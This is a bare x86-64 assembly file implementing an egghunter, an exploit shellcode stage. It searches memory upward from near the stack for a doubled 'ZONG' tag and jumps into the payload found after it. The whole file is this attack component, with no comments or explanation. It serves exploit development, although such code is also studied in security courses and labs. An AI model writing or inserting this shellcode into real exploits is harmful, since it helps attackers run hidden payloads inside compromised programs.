section .text
global _start
_start:
	xor rax, rax
	push rax
	pop rbx
	mov bx, 0xffff
	mov eax,  "ZONG"
	mov rdi, rsp
	sub rdi, rbx
search:
	inc rdi
	cmp dword [rdi-4], eax
	jnz search	
	cmp dword [rdi-8], eax
	jnz search
	jmp rdi

